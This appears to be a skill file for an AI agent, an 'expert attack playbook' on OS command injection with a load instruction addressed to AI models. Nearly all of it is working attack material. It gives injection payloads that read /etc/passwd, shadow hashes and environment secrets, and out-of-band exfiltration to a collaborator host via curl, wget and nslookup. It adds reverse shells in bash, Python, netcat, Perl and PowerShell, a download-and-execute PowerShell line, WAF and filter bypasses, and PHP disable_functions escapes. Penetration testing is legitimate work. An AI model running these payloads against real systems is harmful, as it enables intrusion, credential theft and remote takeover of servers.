---
name: cmdi-command-injection
description: >-
  Command injection playbook. Use when user input may reach shell commands, process execution, converters, import pipelines, or blind out-of-band command sinks.
---

# SKILL: OS Command Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert command injection techniques. Covers all shell metacharacters, blind injection, time-based detection, OOB exfiltration, polyglot payloads, and real-world code patterns. Base models miss subtle injection through unexpected input vectors.

## 0. RELATED ROUTING

Before going deep, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when the shell sink is part of a broader upload, import, or conversion workflow

### First-pass payload families

| Context | Start With | Backup |
|---|---|---|
| generic shell separator | `;id` | `&&id` |
| quoted argument | `";id;"` | `';id;'` |
| blind timing | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| command substitution | `$(id)` | `` `id` `` |
| out-of-band DNS | `;nslookup token.collab` | Windows `nslookup` variant |

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

---

## 1. SHELL METACHARACTERS (INJECTION OPERATORS)

These characters break out of the command context and inject new commands:

| Metacharacter | Behavior | Example |
|---|---|---|
| `;` | Runs second command regardless | `dir; whoami` |
| `\|` | Pipes stdout to second command | `dir \| whoami` |
| `\|\|` | Run second only if first FAILS | `dir \|\| whoami` |
| `&` | Run second in background (or sequenced in Windows) | `dir & whoami` |
| `&&` | Run second only if first SUCCEEDS | `dir && whoami` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |
| `` `cmd` `` | Command substitution (backtick) | `` echo `whoami` `` |
| `>` | Redirect stdout to file | `cmd > /tmp/out` |
| `>>` | Append to file | `cmd >> /tmp/out` |
| `<` | Read file as stdin | `cmd < /etc/passwd` |
| `%0a` | Newline character (URL-encoded) | `cmd%0awhoami` |
| `%0d%0a` | CRLF | Multi-command injection |

---

## 2. COMMON VULNERABLE CODE PATTERNS

### PHP
```php
$dir = $_GET['dir'];
$out = shell_exec("du -h /var/www/html/" . $dir);
// Inject: dir=../ ; cat /etc/passwd
// Inject: dir=../ $(cat /etc/passwd)

exec("ping -c 1 " . $ip);          // $ip = "127.0.0.1 && cat /etc/passwd"
system("convert " . $file);        // ImageMagick RCE
passthru("nslookup " . $host);     // $host = "x.com; id"
```

### Python
```python
import os
os.system("curl " + url)            # url = "x.com; id"
subprocess.call("ls " + path, shell=True)  # shell=True is the key vulnerability
os.popen("ping " + host)
```

### Node.js
```javascript
const { exec } = require('child_process');
exec('ping ' + req.query.host, ...);  // host = "x.com; id"
```

### Perl
```perl
$dir = param("dir");
$command = "du -h /var/www/html" . $dir;
system($command);
// Inject dir field: | cat /etc/passwd
```

### ASP (Classic)
```vb
szCMD = "type C:\logs\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
// Inject FileName: foo.txt & whoami > C:\inetpub\wwwroot\out.txt
```

---

## 3. BLIND COMMAND INJECTION — DETECTION

When response shows no command output:

### Time-Based Detection
```bash
# Linux:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& sleep 5 &

# Windows:
& timeout /T 5 /NOBREAK
& ping -n 5 127.0.0.1
& waitfor /T 5 signal777
```
Compare response time without payload vs with payload. 5+ second delay = confirmed.

### OOB via DNS
```bash
# Linux:
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)

# Windows:
& nslookup BURP_COLLAB_HOST
& nslookup %USERNAME%.BURP_COLLAB_HOST
```

### OOB via HTTP
```bash
# Linux:
; curl http://BURP_COLLAB_HOST/`whoami`
; wget http://BURP_COLLAB_HOST/$(id|base64)

# Windows:
& powershell -c "Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)"
```

### OOB via Out-of-Band File
```bash
; id > /var/www/html/RANDOM_FILE.txt
# Then access: https://target.com/RANDOM_FILE.txt
```

---

## 4. INJECTION CONTEXT VARIATIONS

### Within Quoted String
```bash
command "INJECT"
# Inject: " ; id ; "
# Result: command "" ; id ; ""
```

### Within Single-Quoted String
```bash
command 'INJECT'
# Inject: '; id;'
# Result: command ''; id;''
```

### Within Backtick Execution
```bash
output=`command INJECT`
# Inject: x`; id ;`
```

### File Path Context
```bash
cat /var/log/INJECT
# Inject: ../../../etc/passwd (path traversal)
# Inject: access.log; id (command injection)
```

---

## 5. PAYLOAD LIBRARY

### Information Gathering
```bash
; id                          # current user
; whoami                      # user name
; uname -a                    # OS info
; cat /etc/passwd             # user list
; cat /etc/shadow             # password hashes (if root)
; ls /home/                   # home directories
; env                         # environment variables (DB creds, API keys!)
; printenv                    # same
; cat /proc/1/environ         # process environment
; ifconfig                    # network interfaces
; cat /etc/hosts              # host entries
```

### Reverse Shells (Linux)
```bash
# Bash:
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e):
; nc ATTACKER 4444 -e /bin/bash

# Netcat (without -e / OpenBSD):
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl:
; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Reverse Shells (Windows via PowerShell)
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 6. FILTER BYPASS TECHNIQUES

### Space Alternatives (when space is filtered)
```bash
cat</etc/passwd          # < instead of space
{cat,/etc/passwd}        # brace expansion
cat$IFS/etc/passwd       # $IFS variable (field separator)
X=$'\x20'&&cat${X}/etc/passwd  # hex encoded space
```

### Slash Alternatives (when `/` is filtered)
```bash
$'\057'etc$'\057'passwd  # octal representation
cat /???/???sec???        # glob expansion
```

### Keyword Bypass via Variable Assembly
```bash
a=c;b=at;c=/etc/passwd; $a$b $c   # 'cat /etc/passwd'
c=at;ca$c /etc/passwd              # cat
```

### Newline Injection
```
cmd%0Aid%0Awhoami          # URL-encoded newlines
cmd$'\n'id$'\n'whoami      # literal newlines
```

---

## 7. COMMON INJECTION ENTRY POINTS

| Entry | Example |
|---|---|
| Network tools | ping, nslookup, traceroute, whois forms |
| File conversion | image resize, PDF generate, format convert |
| Email senders | From address, name fields in notification emails |
| Search/sort parameters | Passed to grep, find, sort commands |
| Log viewing | Passed to tail, grep commands |
| Custom script execution | "Run test" features, CI/CD hooks |
| DNS lookup features | rDNS lookup, WHOIS query |
| Backup/restore features | File path parameters |
| Archive processing | zip/unzip, tar with user-provided filename |

---

## 8. BLIND INJECTION DECISION TREE

```
Found potential injection point?
├── Try basic: ; sleep 5
│   └── Response delays? → Confirmed blind injection
│       ├── Extract data via timing: if/then sleep
│       └── Use OOB: curl/nslookup to Collaborator
│
├── No delay observed?
│   ├── Try: | sleep 5
│   ├── Try: $(sleep 5)
│   ├── Try: ` sleep 5 `
│   ├── Try after URL encoding: %3B%20sleep%205
│   └── Try double encoding: %253B%2520sleep%25205
│
└── All blocked → check WEB APPLICATION LAYER
    Filter on input? → encode differently
    Filter on specific commands? → whitespace bypass, $IFS, glob
```

---

## 9. ADVANCED WAF BYPASS TECHNIQUES

### Wildcard Expansion

```bash
# Use ? and * to bypass keyword filters:
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/???/????2 *.php     # /usr/bin/find2 *.php (approximate)

# Globbing for specific files:
cat /e?c/p?sswd
cat /e*c/p*d
```

### cat Alternatives (when "cat" is filtered)

```bash
tac /etc/passwd          # reverse cat
nl /etc/passwd           # numbered lines
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd
strings /etc/passwd
od -c /etc/passwd
base64 /etc/passwd       # then decode offline
```

### Comment Insertion (PHP specific)

```bash
# Insert comments within function names to bypass WAF:
sys/*x*/tem('id')        # PHP ignores /* */ in some eval contexts
# Note: this works with eval() and similar PHP dynamic calls
```

### XOR String Construction (PHP)

```php
# Build function names from XOR of printable characters:
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
# Produces: "assert"
$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
# Evaluates: assert("system")
```

### Base64/ROT13 Encoding

```php
# Encode payload, decode at runtime:
base64_decode('c3lzdGVt')('id');     # system('id')
str_rot13('flfgrz')('id');           # system → flfgrz via ROT13
```

### chr() Assembly

```php
# Build strings character by character:
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

### Dollar-Sign Variable Tricks

```bash
# $IFS (Internal Field Separator) as space:
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Unset variables expand to empty:
c${x}at /etc/passwd      # $x is unset → "cat"
```

---

## 10. PHP disable_functions BYPASS PATHS

When `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` are all disabled:

### Path 1: LD_PRELOAD + mail()/putenv()

```php
// 1. Upload shared object (.so) that hooks a libc function
// 2. Set LD_PRELOAD to point to it
putenv("LD_PRELOAD=/tmp/evil.so");
// 3. Trigger external process (mail() calls sendmail)
mail("a@b.com", "", "");
// The .so's constructor runs with shell access
```

### Path 2: Shellshock (CVE-2014-6271)

```php
// If bash is vulnerable to Shellshock:
putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out");
mail("a@b.com", "", "");
// Bash processes the function definition and runs the trailing command
```

### Path 3: Apache mod_cgi + .htaccess

```php
// Write .htaccess enabling CGI:
file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\nAddHandler cgi-script .sh');
// Write CGI script:
file_put_contents('/var/www/html/cmd.sh', "#!/bin/bash\necho Content-type: text/html\necho\n$1");
chmod('/var/www/html/cmd.sh', 0755);
// Access: /cmd.sh?id
```

### Path 4: PHP-FPM / FastCGI

```php
// If PHP-FPM socket is accessible (/var/run/php-fpm.sock or port 9000):
// Send crafted FastCGI request to execute arbitrary PHP with different php.ini
// Tool: https://github.com/neex/phuip-fpizdam
// Override: PHP_VALUE=auto_prepend_file=/tmp/shell.php
```

### Path 5: COM Object (Windows)

```php
// Windows only, if COM extension enabled:
$wsh = new COM('WScript.Shell');
$exec = $wsh->Run('cmd /c whoami > C:\inetpub\wwwroot\out.txt', 0, true);
```

### Path 6: ImageMagick Delegate (CVE-2016-3714 "ImageTragick")

```php
// If ImageMagick processes user-uploaded images:
// Upload SVG/MVG with embedded command:
// Content of exploit.svg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

**Also consider (summary):** iconv (CVE-2024-2961) via `php://filter/convert.iconv`; FFI (`FFI::cdef` + `libc`) when the extension is enabled.

---

## 11. COMPONENT-LEVEL COMMAND INJECTION

### ImageMagick Delegate Abuse

```
# MVG format with shell command in URL:
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'
pop graphic-context

# Or via filename: convert '|id' out.png
```

### FFmpeg (HLS/concat protocol)

```
# SSRF/LFI via m3u8 playlist:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST

# Upload as .m3u8, FFmpeg processes and may leak file contents in output
```

### Elasticsearch Groovy Script (pre-5.x)

```json
POST /_search
{
  "query": { "match_all": {} },
  "script_fields": {
    "cmd": {
      "script": "Runtime rt = Runtime.getRuntime(); rt.exec('id')"
    }
  }
}
```

### Ping/Traceroute/NSLookup Diagnostic Pages

```
# Classic injection point in network diagnostic features:
# Input: 127.0.0.1; id
# Input: 127.0.0.1 && cat /etc/passwd
# Input: `id`.attacker.com (DNS exfil via backtick)
# These features directly call OS commands with user input
```

**Other sinks (quick reference):** PDF generators (wkhtmltopdf / WeasyPrint with user HTML); Git wrappers (`git clone` URL / hooks).
